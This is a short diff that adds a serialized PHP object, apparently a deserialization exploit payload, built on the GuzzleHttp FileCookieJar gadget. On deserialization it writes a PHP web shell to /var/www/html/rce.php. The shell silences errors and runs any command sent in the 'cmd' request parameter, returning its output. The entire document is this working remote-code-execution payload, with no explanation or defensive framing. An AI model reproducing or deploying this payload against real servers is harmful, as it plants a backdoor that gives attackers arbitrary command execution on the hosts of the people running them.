@@ -1,0 +1,13 @@
+_|O:31:"GuzzleHttp\Cookie\FileCookieJar":4:{S:7:"cookies";a:1:{i:0;O:27:"GuzzleHttp\Cookie\SetCookie":1:{S:4:"data";a:3:{S:7:"Expires";i:1;S:7:"Discard";b:0;S:5:"Value";S:325:"<?php
+@error_reporting(0);
+@ini_set('display_errors', 0);
+if(isset($_REQUEST['cmd'])){
+    $output = @shell_exec($_REQUEST['cmd'] . ' 2>&1');
+    if($output === null || $output === false) {
+        $output = @exec($_REQUEST['cmd'] . ' 2>&1', $arr);
+        $output = @join("\n", $arr);
+    }
+    echo $output;
+    die();
+}
+?>";}}}S:10:"strictMode";N;S:8:"filename";S:21:"/var/www/html/rce.php";S:19:"storeSessionCookies";b:1;}
